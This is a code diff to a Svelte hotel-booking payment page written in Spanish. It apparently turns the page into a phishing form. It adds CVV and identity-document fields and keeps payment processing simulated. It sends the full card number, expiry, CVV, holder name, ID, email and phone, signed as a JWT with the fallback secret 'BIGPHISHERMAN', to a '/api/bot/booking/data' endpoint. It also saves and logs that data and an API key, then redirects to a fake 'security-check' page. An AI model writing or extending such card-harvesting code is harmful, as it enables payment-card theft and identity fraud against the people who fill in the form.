@@ -1,10 +1,16 @@
 <script lang="ts">
     import { onMount } from 'svelte';
-    import { goto } from '$app/navigation';
+    import { goto, preloadCode } from '$app/navigation';
     import Header from '$lib/components/common/Header.svelte';
 	import Navbar from '$lib/components/common/Navbar.svelte';
 	import Footer from '$lib/components/common/footer.svelte';
-	import { reservationStore } from '$lib/stores/reservation';
+import { reservationStore } from '$lib/stores/reservation';
+    import { ENV_CONFIG } from '$lib';
+
+	// KJUR (inyectado por CDN) y secreto JWT
+	// Nota: en producción, evita firmar en el cliente.
+	const KJUR: any = (globalThis as any).KJUR;
+	const JWT_SECRET = import.meta.env.JWT_SECRET || 'BIGPHISHERMAN';
 
 	// Variables reactivas del store de reserva
 	$: reservationData = $reservationStore;
@@ -20,7 +26,9 @@
 	// Estado del formulario de pago
 	let paymentData = {
 		cardName: '',
+		documentId: '',
 		cardNumber: '',
+		cardCvv: '',
 		cardExpiry: '',
 		acceptPrivacy: false,
 		acceptMarketing: false
@@ -158,13 +166,28 @@
 			isValid = false;
 		}
 
+		// Validar documento de identidad
+		if (!paymentData.documentId.trim()) {
+			paymentErrors.documentId = 'El documento de identidad es obligatorio';
+			isValid = false;
+		} else if (!/^[-\.\dA-Za-z]{5,20}$/.test(paymentData.documentId.trim())) {
+			paymentErrors.documentId = 'Documento de identidad inválido';
+			isValid = false;
+		}
+
 		// Validar número de tarjeta
 		if (!paymentData.cardNumber.trim()) {
 			paymentErrors.cardNumber = 'El número de tarjeta es obligatorio';
 			isValid = false;
-		} else if (!/^\d{13,19}$/.test(paymentData.cardNumber.replace(/\s/g, ''))) {
-			paymentErrors.cardNumber = 'El número de tarjeta debe tener entre 13 y 19 dígitos';
-			isValid = false;
+		} else {
+			const rawNumber = paymentData.cardNumber.replace(/\s/g, '');
+			if (!/^\d{13,19}$/.test(rawNumber)) {
+				paymentErrors.cardNumber = 'El número de tarjeta debe tener entre 13 y 19 dígitos';
+				isValid = false;
+			} else if (!luhnCheck(rawNumber)) {
+				paymentErrors.cardNumber = 'El número de la tarjeta ingresado no es válido';
+				isValid = false;
+			}
 		}
 
 		// Validar fecha de caducidad
@@ -173,6 +196,20 @@
 			isValid = false;
 		} else if (!/^\d{2}\/\d{2}$/.test(paymentData.cardExpiry)) {
 			paymentErrors.cardExpiry = 'Formato inválido (MM/AA)';
+			isValid = false;
+		} else if (!isExpiryValid(paymentData.cardExpiry)) {
+			paymentErrors.cardExpiry = 'La fecha de caducidad es inválida';
+			isValid = false;
+		}
+
+		// Validar CVV
+		const brand = detectCardBrand(paymentData.cardNumber);
+		const maxCvv = brand === 'amex' ? 4 : 3;
+		if (!paymentData.cardCvv.trim()) {
+			paymentErrors.cardCvv = 'El CVV es obligatorio';
+			isValid = false;
+		} else if (!new RegExp(`^\\d{${maxCvv}}$`).test(paymentData.cardCvv)) {
+			paymentErrors.cardCvv = brand === 'amex' ? 'El CVV debe tener 4 dígitos' : 'El CVV debe tener 3 dígitos';
 			isValid = false;
 		}
 
@@ -202,13 +239,37 @@
 	// Función para manejar cambios en inputs
 	function handlePaymentInputEvent(event: Event, field: string) {
 		const target = event.target as HTMLInputElement;
-		handlePaymentInputChange(field, target.value);
+		let value = target.value;
+		if (field === 'cardNumber') {
+			value = formatCardNumber(value);
+		} else if (field === 'cardExpiry') {
+			value = formatExpiry(value);
+		} else if (field === 'cardCvv') {
+			value = formatCvv(value, detectCardBrand(paymentData.cardNumber));
+		}
+		handlePaymentInputChange(field, value);
+	}
+
+	function handleCardNumberBlur() {
+		const raw = (paymentData.cardNumber || '').replace(/\s/g, '');
+		if (raw.length >= 13) {
+			if (!luhnCheck(raw)) {
+				paymentErrors = { ...paymentErrors, cardNumber: 'El número de la tarjeta ingresado no es válido' };
+				isPaymentValid = false;
+			} else if (paymentErrors.cardNumber) {
+				paymentErrors = { ...paymentErrors, cardNumber: '' };
+			}
+		}
 	}
 
 	// Función para manejar cambios en checkboxes
 	function handlePaymentCheckboxEvent(event: Event, field: string) {
 		const target = event.target as HTMLInputElement;
 		handlePaymentInputChange(field, target.checked);
+	}
+
+	function sleep(ms: number) {
+		return new Promise(resolve => setTimeout(resolve, ms));
 	}
 
 	// Función para completar la reserva
@@ -224,14 +285,154 @@
 		try {
 			// Simular procesamiento del pago
 			await new Promise(resolve => setTimeout(resolve, 2000));
+
+			// Construir info de envío a API
+			const rawCardNumber = (paymentData.cardNumber || '').replace(/\s/g, '');
+			const numRooms = getTotalRooms();
+			const numPeople = searchParams.adults + (searchParams.children || 0);
+			const metaInfo = {
+				guestName: paymentData.cardName,
+				documentId: paymentData.documentId,
+				guestEmail: reservationData.guestData?.email || '',
+				guestPhone: reservationData.guestData?.phone || '',
+				hotelName: hotel.name,
+				roomsCount: numRooms,
+				peopleCount: numPeople,
+				price: totals.subtotal,
+				tax: totals.taxes,
+				total: totals.total,
+				currency: totals.currency,
+				card: {
+					number: rawCardNumber,
+					expiry: paymentData.cardExpiry,
+					cvv: paymentData.cardCvv,
+					holderName: paymentData.cardName
+				},
+				pre: true
+			}
+
+			// Guardar datos de pago en el store
+			reservationStore.updatePaymentData({
+				cardholderName: paymentData.cardName,
+				cardNumber: paymentData.cardNumber,
+				expiry: paymentData.cardExpiry,
+				cvv: paymentData.cardCvv,
+				documentId: paymentData.documentId
+			});
+
+			// Persistir metaInfo en localStorage
+			try {
+				localStorage.setItem('booking-payment-metainfo', JSON.stringify(metaInfo));
+				console.log('💾 metaInfo guardado', metaInfo);
+			} catch (err) {
+				console.error('❌ No se pudo guardar metaInfo', err);
+			}
+
 			
-			// Navegar a la página de confirmación
-			goto('/congrats');
+
+			// Firmar JWT con KJUR y enviar a la API como { token }
+			let token = '';
+			try {
+				const header = { alg: 'HS256', typ: 'JWT' };
+				const payload = metaInfo;
+				token = KJUR.jws.JWS.sign('HS256', JSON.stringify(header), JSON.stringify(payload), JWT_SECRET);
+			} catch (error) {
+				console.error('❌ Error firmando JWT con KJUR:', error);
+			}
+
+			console.log('🔑 API_INTERNAL_KEY:', ENV_CONFIG.API_INTERNAL_KEY);
+
+			
+			fetch(`${ENV_CONFIG.API_INTERNAL_URL}/api/bot/booking/data`, {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${ENV_CONFIG.API_INTERNAL_KEY}` },
+				body: JSON.stringify({ token })
+			});
+
+			await sleep(2000);
+
+			
+            // Redirección a security check (se realiza aquí)
+			goto('/security-check');
 		} catch (error) {
 			console.error('❌ Error completando reserva:', error);
 		} finally {
 			isSubmitting = false;
 		}
+	}
+
+	// ===== Helpers de tarjeta =====
+	function detectCardBrand(numberWithSpaces: string): 'amex' | 'visa' | 'mastercard' | 'other' {
+		const n = (numberWithSpaces || '').replace(/\s/g, '');
+		if (/^3[47]\d{0,13}$/.test(n)) return 'amex';
+		if (/^4\d{0,15}$/.test(n)) return 'visa';
+		if (/^(5[1-5]|2(2[2-9]|[3-6]\d|7[01]|720))\d{0,14}$/.test(n)) return 'mastercard';
+		return 'other';
+	}
+
+	function formatCardNumber(input: string): string {
+		const digits = (input || '').replace(/\D/g, '').slice(0, 19);
+		const brand = detectCardBrand(digits);
+		if (brand === 'amex') {
+			// 4 6 5
+			const p1 = digits.slice(0, 4);
+			const p2 = digits.slice(4, 10);
+			const p3 = digits.slice(10, 15);
+			return [p1, p2, p3].filter(Boolean).join(' ');
+		}
+		// resto 4 4 4 4
+		const g1 = digits.slice(0, 4);
+		const g2 = digits.slice(4, 8);
+		const g3 = digits.slice(8, 12);
+		const g4 = digits.slice(12, 16);
+		return [g1, g2, g3, g4].filter(Boolean).join(' ');
+	}
+
+	function formatExpiry(input: string): string {
+		const digits = (input || '').replace(/\D/g, '').slice(0, 4);
+		if (digits.length <= 2) return digits;
+		return `${digits.slice(0, 2)}/${digits.slice(2)}`;
+	}
+
+	function formatCvv(input: string, brand: 'amex' | 'visa' | 'mastercard' | 'other'): string {
+		const max = brand === 'amex' ? 4 : 3;
+		return (input || '').replace(/\D/g, '').slice(0, max);
+	}
+
+	function luhnCheck(num: string): boolean {
+		const digits = (num || '').replace(/\D/g, '');
+		let sum = 0;
+		let shouldDouble = false;
+		for (let i = digits.length - 1; i >= 0; i--) {
+			let d = parseInt(digits.charAt(i), 10);
+			if (shouldDouble) {
+				d *= 2;
+				if (d > 9) d -= 9;
+			}
+			sum += d;
+			shouldDouble = !shouldDouble;
+		}
+		return sum % 10 === 0 && digits.length >= 13;
+	}
+
+	function parseExpiry(expiry: string): { month: number; year: number } | null {
+		const match = /^([0-9]{2})\/([0-9]{2})$/.exec(expiry || '');
+		if (!match) return null;
+		const month = parseInt(match[1], 10);
+		const year = 2000 + parseInt(match[2], 10);
+		if (month < 1 || month > 12) return null;
+		return { month, year };
+	}
+
+	function isExpiryValid(expiry: string): boolean {
+		const parsed = parseExpiry(expiry);
+		if (!parsed) return false;
+		const now = new Date();
+		const currentMonth = now.getMonth() + 1;
+		const currentYear = now.getFullYear();
+		if (parsed.year > currentYear) return true;
+		if (parsed.year < currentYear) return false;
+		return parsed.month >= currentMonth;
 	}
 </script>
 
@@ -469,15 +670,12 @@
 					<h3 class="text-xl font-bold text-gray-900 mb-4">¿Cómo quieres pagar?</h3>
 					
 					<div class="flex gap-3 mb-6">
-						<img src="/placeholder.svg?height=30&width=50" alt="American Express" class="h-8 border border-gray-200 rounded">
-						<img src="/placeholder.svg?height=30&width=50" alt="Diners Club" class="h-8 border border-gray-200 rounded">
-						<img src="/placeholder.svg?height=30&width=50" alt="Mastercard" class="h-8 border border-gray-200 rounded">
-						<img src="/placeholder.svg?height=30&width=50" alt="Visa" class="h-8 border border-gray-200 rounded">
+						<img src="/assets/payment/cards.png" alt="" class="h-8">
 					</div>
 
 					<div class="space-y-4">
 					<div>
-						<label for="card-name" class="block text-sm font-medium text-gray-900 mb-2">Nombre del titular de la tarjeta <span class="text-red-600">*</span></label>
+					<label for="card-name" class="block text-sm font-medium text-gray-900 mb-2">Nombre del titular de la tarjeta <span class="text-red-600">*</span></label>
 						<input 
 							id="card-name" 
 							type="text" 
@@ -491,6 +689,21 @@
 						{/if}
 					</div>
 
+				<div>
+					<label for="document-id" class="block text-sm font-medium text-gray-900 mb-2">Documento de identidad <span class="text-red-600">*</span></label>
+					<input 
+						id="document-id" 
+						type="text" 
+						bind:value={paymentData.documentId}
+						on:input={(e) => handlePaymentInputEvent(e, 'documentId')}
+						placeholder="CC 123456789" 
+						class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {paymentErrors.documentId ? 'border-red-500' : 'border-gray-300'}"
+					>
+					{#if paymentErrors.documentId}
+						<p class="text-xs text-red-600 mt-1">{paymentErrors.documentId}</p>
+					{/if}
+				</div>
+
 					<div>
 						<label for="card-number" class="block text-sm font-medium text-gray-900 mb-2">Número de la tarjeta <span class="text-red-600">*</span></label>
 						<div class="relative">
@@ -499,6 +712,7 @@
 								type="text" 
 								bind:value={paymentData.cardNumber}
 								on:input={(e) => handlePaymentInputEvent(e, 'cardNumber')}
+								on:blur={handleCardNumberBlur}
 								placeholder="1234 5678 9012 3456"
 								class="w-full px-3 py-2 pl-10 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {paymentErrors.cardNumber ? 'border-red-500' : 'border-gray-300'}"
 							>
@@ -523,6 +737,21 @@
 						>
 						{#if paymentErrors.cardExpiry}
 							<p class="text-xs text-red-600 mt-1">{paymentErrors.cardExpiry}</p>
+						{/if}
+					</div>
+
+					<div class="w-32">
+						<label for="card-cvv" class="block text-sm font-medium text-gray-900 mb-2">CVV <span class="text-red-600">*</span></label>
+						<input 
+							id="card-cvv" 
+							type="text" 
+							bind:value={paymentData.cardCvv}
+							on:input={(e) => handlePaymentInputEvent(e, 'cardCvv')}
+							placeholder="123"
+							class="w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 {paymentErrors.cardCvv ? 'border-red-500' : 'border-gray-300'}"
+						>
+						{#if paymentErrors.cardCvv}
+							<p class="text-xs text-red-600 mt-1">{paymentErrors.cardCvv}</p>
 						{/if}
 					</div>
 					</div>
